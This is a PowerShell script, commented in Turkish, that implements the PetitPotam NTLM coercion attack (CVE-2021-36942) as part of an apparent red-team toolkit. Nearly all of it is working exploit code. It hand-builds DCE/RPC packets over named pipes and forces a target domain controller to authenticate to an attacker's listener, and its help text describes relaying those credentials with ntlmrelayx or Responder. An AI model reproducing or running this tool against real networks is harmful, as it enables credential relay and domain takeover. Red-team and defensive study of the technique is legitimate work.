<#
.SYNOPSIS
    PetitPotam saldırısının pure PowerShell implementasyonu.
    Python bağımlılığı olmadan NTLM coercion yapar.

.DESCRIPTION
    MS-EFSRPC (Encrypting File System Remote Protocol) fonksiyonlarını
    kullanarak hedef makinenin NTLM authentication'ını bir listener'a
    yönlendirir. Bu, orijinal PetitPotam.py'nin PowerShell portudur.

    Named pipe üzerinden EFS RPC çağrısı yaparak hedef makinenin
    makine hesabı ile saldırgan makineye authentication yapmasını sağlar.

    Saldırı Zinciri:
    1. Saldırgan makinede ntlmrelayx veya Responder başlat
    2. Invoke-PetitPotam ile hedefe coercion gönder
    3. Hedef makine, listener'a NTLM auth yapar
    4. Bu auth yakalanır ve relay edilir (LDAP, SMB, HTTP vb.)

    Kullanılabilir Named Pipe'lar:
    - lsarpc   : \PIPE\lsarpc (varsayılan, çoğu durumda çalışır)
    - efsr     : \PIPE\efsrpc (doğrudan EFS pipe)
    - samr     : \PIPE\samr
    - netlogon : \PIPE\netlogon
    - lsass    : \PIPE\lsass

.PARAMETER Target
    Hedef makine (IP veya hostname). Genellikle Domain Controller.

.PARAMETER Listener
    Authentication'ın yönlendirileceği saldırgan makine (IP veya hostname).

.PARAMETER Username
    Opsiyonel. Domain kullanıcı adı.

.PARAMETER Password
    Opsiyonel. Kullanıcı parolası.

.PARAMETER Domain
    Opsiyonel. Domain adı.

.PARAMETER Pipe
    Kullanılacak named pipe. Varsayılan: lsarpc
    Seçenekler: lsarpc, efsr, samr, netlogon, lsass, all

.EXAMPLE
    # Varsayılan ayarlarla (anonim, lsarpc pipe)
    Invoke-PetitPotam -Target DC01.domain.local -Listener 10.0.0.5

.EXAMPLE
    # Kimlik bilgileri ile
    Invoke-PetitPotam -Target DC01 -Listener 10.0.0.5 -Username "user1" -Password "Pass123" -Domain "domain.local"

.EXAMPLE
    # Tüm pipe'ları dene
    Invoke-PetitPotam -Target DC01 -Listener 10.0.0.5 -Pipe all

.EXAMPLE
    # Belirli pipe ile
    Invoke-PetitPotam -Target DC01 -Listener 10.0.0.5 -Pipe efsr

.NOTES
    Orijinal Araç: PetitPotam.py by topotam (@topotam77)
    PowerShell Port: AD Red Team PowerShell Toolkit
    CVE: CVE-2021-36942 (kısmen yamalanmış, bazı fonksiyonlar hala çalışır)
#>

function Invoke-PetitPotam {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Target,

        [Parameter(Mandatory = $true, Position = 1)]
        [string]$Listener,

        [Parameter(Mandatory = $false)]
        [string]$Username = "",

        [Parameter(Mandatory = $false)]
        [string]$Password = "",

        [Parameter(Mandatory = $false)]
        [string]$Domain = "",

        [Parameter(Mandatory = $false)]
        [ValidateSet("lsarpc", "efsr", "samr", "netlogon", "lsass", "all")]
        [string]$Pipe = "lsarpc"
    )

    $banner = @"

              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

                        PowerShell Port - NTLM Coercion via MS-EFSRPC

"@
    Write-Host $banner -ForegroundColor Red

    # EFS RPC UUID'leri
    $MSRPC_UUID_EFSR_LSARPC = "c681d488-d850-11d0-8c52-00c04fd90f7e"
    $MSRPC_UUID_EFSR_EFSRPC = "df1941c5-fe89-4e79-bf10-463657acf44d"

    # Pipe yapılandırmaları
    $pipeConfig = @{
        "lsarpc"   = @{ Path = "\\$Target\PIPE\lsarpc";   UUID = $MSRPC_UUID_EFSR_LSARPC }
        "efsr"     = @{ Path = "\\$Target\PIPE\efsrpc";   UUID = $MSRPC_UUID_EFSR_EFSRPC }
        "samr"     = @{ Path = "\\$Target\PIPE\samr";     UUID = $MSRPC_UUID_EFSR_LSARPC }
        "netlogon" = @{ Path = "\\$Target\PIPE\netlogon"; UUID = $MSRPC_UUID_EFSR_LSARPC }
        "lsass"    = @{ Path = "\\$Target\PIPE\lsass";    UUID = $MSRPC_UUID_EFSR_LSARPC }
    }

    # P/Invoke tanımlamaları
    $signature = @"
    [DllImport("netapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int NetApiBufferFree(IntPtr Buffer);
"@

    # UNC path oluştur
    $uncPath = "\\$Listener\test\Settings.ini"

    # Hangi pipe'ları deneyeceğiz
    $pipesToTry = if ($Pipe -eq "all") {
        @("lsarpc", "efsr", "samr", "netlogon", "lsass")
    } else {
        @($Pipe)
    }

    foreach ($currentPipe in $pipesToTry) {
        Write-Host ""
        Write-Host "=" * 60 -ForegroundColor DarkGray
        Write-Host "[*] Pipe deneniyor: $currentPipe" -ForegroundColor Cyan
        Write-Host "[*] Hedef: $Target" -ForegroundColor Cyan
        Write-Host "[*] Listener: $Listener" -ForegroundColor Cyan
        Write-Host "[*] UNC Path: $uncPath" -ForegroundColor Cyan

        try {
            # SMB bağlantısı oluştur (kimlik bilgileri ile veya anonim)
            $pipePath = "\\$Target\pipe\$currentPipe"

            if ($Username -and $Password) {
                # Kimlik bilgileri ile bağlantı
                Write-Host "[*] Kimlik bilgileri ile bağlanılıyor: $Domain\$Username" -ForegroundColor Cyan

                # Net use ile bağlantı
                $netCmd = "net use \\$Target\IPC$ /user:$Domain\$Username `"$Password`" 2>&1"
                $netResult = Invoke-Expression $netCmd
                Write-Host "[*] SMB bağlantısı: $netResult" -ForegroundColor DarkGray
            }

            # EFS RPC çağrısı - EfsRpcOpenFileRaw
            Write-Host "[-] EfsRpcOpenFileRaw gönderiliyor..." -ForegroundColor Yellow

            # .NET ile RPC çağrısı
            # Win32 API üzerinden named pipe bağlantısı
            $pipeHandle = $null

            # CreateFile P/Invoke
            $createFileSignature = @"
using System;
using System.Runtime.InteropServices;

public class Win32Pipe {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TransactNamedPipe(
        IntPtr hNamedPipe,
        byte[] lpInBuffer,
        uint nInBufferSize,
        byte[] lpOutBuffer,
        uint nOutBufferSize,
        out uint lpBytesRead,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped
    );

    public const uint GENERIC_READ = 0x80000000;
    public const uint GENERIC_WRITE = 0x40000000;
    public const uint OPEN_EXISTING = 3;
    public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
    public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
}
"@

            try {
                Add-Type -TypeDefinition $createFileSignature -ErrorAction SilentlyContinue
            } catch {
                # Type zaten eklenmiş olabilir
            }

            # Named pipe'a bağlan
            $pipeFullPath = "\\$Target\pipe\$currentPipe"
            Write-Host "[-] Named pipe'a bağlanılıyor: $pipeFullPath" -ForegroundColor Yellow

            $handle = [Win32Pipe]::CreateFile(
                $pipeFullPath,
                [Win32Pipe]::GENERIC_READ -bor [Win32Pipe]::GENERIC_WRITE,
                0,
                [IntPtr]::Zero,
                [Win32Pipe]::OPEN_EXISTING,
                0,
                [IntPtr]::Zero
            )

            if ($handle -eq [Win32Pipe]::INVALID_HANDLE_VALUE) {
                $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "[-] Pipe bağlantısı başarısız. Win32 Error: $errorCode"

                # Yetki hatası ise bilgilendir
                if ($errorCode -eq 5) {
                    Write-Host "[-] Erişim reddedildi. Kimlik bilgileri gerekebilir." -ForegroundColor Red
                }
                elseif ($errorCode -eq 53) {
                    Write-Host "[-] Ağ yolu bulunamadı. Hedef erişilebilir mi kontrol edin." -ForegroundColor Red
                }
                continue
            }

            Write-Host "[+] Pipe bağlantısı başarılı!" -ForegroundColor Green

            # RPC Bind request oluştur
            $uuid = $pipeConfig[$currentPipe].UUID
            $uuidBytes = [System.Guid]::Parse($uuid).ToByteArray()

            # DCE/RPC Bind PDU
            $rpcBind = New-Object System.Collections.Generic.List[byte]

            # RPC Header
            $rpcBind.Add(0x05)  # Version major
            $rpcBind.Add(0x00)  # Version minor
            $rpcBind.Add(0x0B)  # Packet type: Bind
            $rpcBind.Add(0x03)  # Flags: first+last frag
            # Data representation (little-endian)
            $rpcBind.AddRange([byte[]](0x10, 0x00, 0x00, 0x00))
            # Frag length (will be updated)
            $rpcBind.AddRange([byte[]](0x48, 0x00))
            # Auth length
            $rpcBind.AddRange([byte[]](0x00, 0x00))
            # Call ID
            $rpcBind.AddRange([byte[]](0x01, 0x00, 0x00, 0x00))
            # Max xmit frag
            $rpcBind.AddRange([byte[]](0xB8, 0x10))
            # Max recv frag
            $rpcBind.AddRange([byte[]](0xB8, 0x10))
            # Assoc group
            $rpcBind.AddRange([byte[]](0x00, 0x00, 0x00, 0x00))
            # Num ctx items
            $rpcBind.Add(0x01)
            # Padding
            $rpcBind.AddRange([byte[]](0x00, 0x00, 0x00))
            # Context ID
            $rpcBind.AddRange([byte[]](0x00, 0x00))
            # Num trans items
            $rpcBind.Add(0x01)
            $rpcBind.Add(0x00)
            # Abstract syntax (EFS UUID)
            $rpcBind.AddRange($uuidBytes)
            # Version
            $rpcBind.AddRange([byte[]](0x01, 0x00))
            # Minor version
            $rpcBind.AddRange([byte[]](0x00, 0x00))
            # Transfer syntax (NDR)
            $ndrUuid = [System.Guid]::Parse("8a885d04-1ceb-11c9-9fe8-08002b104860").ToByteArray()
            $rpcBind.AddRange($ndrUuid)
            # NDR version
            $rpcBind.AddRange([byte[]](0x02, 0x00, 0x00, 0x00))

            $bindBytes = $rpcBind.ToArray()

            # Bind gönder
            $bytesWritten = [uint32]0
            [Win32Pipe]::WriteFile($handle, $bindBytes, [uint32]$bindBytes.Length, [ref]$bytesWritten, [IntPtr]::Zero) | Out-Null

            # Bind response oku
            $responseBuffer = New-Object byte[] 4096
            $bytesRead = [uint32]0
            [Win32Pipe]::ReadFile($handle, $responseBuffer, [uint32]4096, [ref]$bytesRead, [IntPtr]::Zero) | Out-Null

            if ($bytesRead -gt 0 -and $responseBuffer[2] -eq 0x0C) {
                Write-Host "[+] RPC Bind başarılı! UUID: $uuid" -ForegroundColor Green
            }
            elseif ($bytesRead -gt 0 -and $responseBuffer[2] -eq 0x0D) {
                Write-Warning "[-] RPC Bind reddedildi (Bind NAK)."
                [Win32Pipe]::CloseHandle($handle) | Out-Null
                continue
            }
            else {
                Write-Warning "[-] Beklenmeyen RPC yanıtı."
                [Win32Pipe]::CloseHandle($handle) | Out-Null
                continue
            }

            # EfsRpcOpenFileRaw request oluştur (opnum 0)
            $uncPathBytes = [System.Text.Encoding]::Unicode.GetBytes($uncPath + "`0")

            $requestData = New-Object System.Collections.Generic.List[byte]

            # File name - conformant and varying string
            $strLen = ($uncPath.Length + 1)
            $requestData.AddRange([BitConverter]::GetBytes([uint32]$strLen))  # Max count
            $requestData.AddRange([BitConverter]::GetBytes([uint32]0))        # Offset
            $requestData.AddRange([BitConverter]::GetBytes([uint32]$strLen))  # Actual count
            $requestData.AddRange($uncPathBytes)
            # Padding to 4-byte boundary
            $padLen = (4 - ($uncPathBytes.Length % 4)) % 4
            for ($i = 0; $i -lt $padLen; $i++) { $requestData.Add(0x00) }
            # Flag
            $requestData.AddRange([BitConverter]::GetBytes([uint32]0))

            $reqBytes = $requestData.ToArray()

            # RPC Request PDU
            $rpcRequest = New-Object System.Collections.Generic.List[byte]
            $totalLen = 24 + $reqBytes.Length  # RPC header (24 bytes) + stub data

            $rpcRequest.Add(0x05)  # Version major
            $rpcRequest.Add(0x00)  # Version minor
            $rpcRequest.Add(0x00)  # Packet type: Request
            $rpcRequest.Add(0x03)  # Flags: first+last frag
            $rpcRequest.AddRange([byte[]](0x10, 0x00, 0x00, 0x00))  # Data representation
            $rpcRequest.AddRange([BitConverter]::GetBytes([uint16]$totalLen))  # Frag length
            $rpcRequest.AddRange([byte[]](0x00, 0x00))  # Auth length
            $rpcRequest.AddRange([byte[]](0x02, 0x00, 0x00, 0x00))  # Call ID
            $rpcRequest.AddRange([BitConverter]::GetBytes([uint32]$reqBytes.Length))  # Alloc hint
            $rpcRequest.AddRange([byte[]](0x00, 0x00))  # Context ID
            $rpcRequest.AddRange([byte[]](0x00, 0x00))  # Opnum 0 (EfsRpcOpenFileRaw)
            $rpcRequest.AddRange($reqBytes)

            $requestBytes = $rpcRequest.ToArray()

            Write-Host "[-] EfsRpcOpenFileRaw gönderiliyor..." -ForegroundColor Yellow

            # Request gönder
            [Win32Pipe]::WriteFile($handle, $requestBytes, [uint32]$requestBytes.Length, [ref]$bytesWritten, [IntPtr]::Zero) | Out-Null

            # Response oku
            $responseBuffer2 = New-Object byte[] 4096
            $bytesRead2 = [uint32]0
            Start-Sleep -Milliseconds 500
            $readResult = [Win32Pipe]::ReadFile($handle, $responseBuffer2, [uint32]4096, [ref]$bytesRead2, [IntPtr]::Zero)

            if ($bytesRead2 -gt 0) {
                # Response parse et
                $pktType = $responseBuffer2[2]
                if ($pktType -eq 0x03) {
                    # Fault response - hata kodu kontrol et
                    $status = [BitConverter]::ToUInt32($responseBuffer2, 24)
                    if ($status -eq 0x00000035 -or $status -eq 0x00000033) {
                        Write-Host "[+] ERROR_BAD_NETPATH alındı!!" -ForegroundColor Green
                        Write-Host "[+] Saldırı başarılı! Listener'ı kontrol edin." -ForegroundColor Green
                    }
                    elseif ($status -eq 5) {
                        Write-Host "[-] Erişim reddedildi (EfsRpcOpenFileRaw yamalı olabilir)." -ForegroundColor Red
                        Write-Host "[*] EfsRpcEncryptFileSrv deneniyor (opnum 4)..." -ForegroundColor Yellow

                        # Opnum 4 ile tekrar dene
                        $rpcRequest2 = New-Object System.Collections.Generic.List[byte]
                        $rpcRequest2.Add(0x05); $rpcRequest2.Add(0x00)
                        $rpcRequest2.Add(0x00); $rpcRequest2.Add(0x03)
                        $rpcRequest2.AddRange([byte[]](0x10, 0x00, 0x00, 0x00))
                        $rpcRequest2.AddRange([BitConverter]::GetBytes([uint16]$totalLen))
                        $rpcRequest2.AddRange([byte[]](0x00, 0x00))
                        $rpcRequest2.AddRange([byte[]](0x03, 0x00, 0x00, 0x00))
                        $rpcRequest2.AddRange([BitConverter]::GetBytes([uint32]$reqBytes.Length))
                        $rpcRequest2.AddRange([byte[]](0x00, 0x00))
                        $rpcRequest2.AddRange([byte[]](0x04, 0x00))  # Opnum 4 (EfsRpcEncryptFileSrv)
                        $rpcRequest2.AddRange($reqBytes)

                        [Win32Pipe]::WriteFile($handle, $rpcRequest2.ToArray(), [uint32]$rpcRequest2.Count, [ref]$bytesWritten, [IntPtr]::Zero) | Out-Null

                        Start-Sleep -Milliseconds 500
                        $readResult2 = [Win32Pipe]::ReadFile($handle, $responseBuffer2, [uint32]4096, [ref]$bytesRead2, [IntPtr]::Zero)
                        if ($bytesRead2 -gt 0) {
                            Write-Host "[+] EfsRpcEncryptFileSrv yanıtı alındı. Listener'ı kontrol edin." -ForegroundColor Green
                        }
                    }
                    else {
                        Write-Host "[-] RPC Fault. Status: 0x$($status.ToString('X8'))" -ForegroundColor Red
                    }
                }
                elseif ($pktType -eq 0x02) {
                    Write-Host "[+] RPC Response alındı! Listener'ı kontrol edin." -ForegroundColor Green
                }
            }
            else {
                Write-Host "[*] Yanıt alınamadı (timeout). Listener'ı yine de kontrol edin." -ForegroundColor Yellow
            }

            # Temizle
            [Win32Pipe]::CloseHandle($handle) | Out-Null
        }
        catch {
            Write-Error "[!] Hata ($currentPipe): $($_.Exception.Message)"
        }
        finally {
            # Net use bağlantısını temizle
            if ($Username -and $Password) {
                Invoke-Expression "net use \\$Target\IPC$ /delete /y 2>&1" | Out-Null
            }
        }
    }

    Write-Host ""
    Write-Host "[*] PetitPotam tamamlandı." -ForegroundColor Cyan
}

if ($MyInvocation.InvocationName -ne '.') {
    # Komut satırından çalıştırma desteği
    if ($args.Count -ge 2) {
        Invoke-PetitPotam -Target $args[1] -Listener $args[0]
    }
}
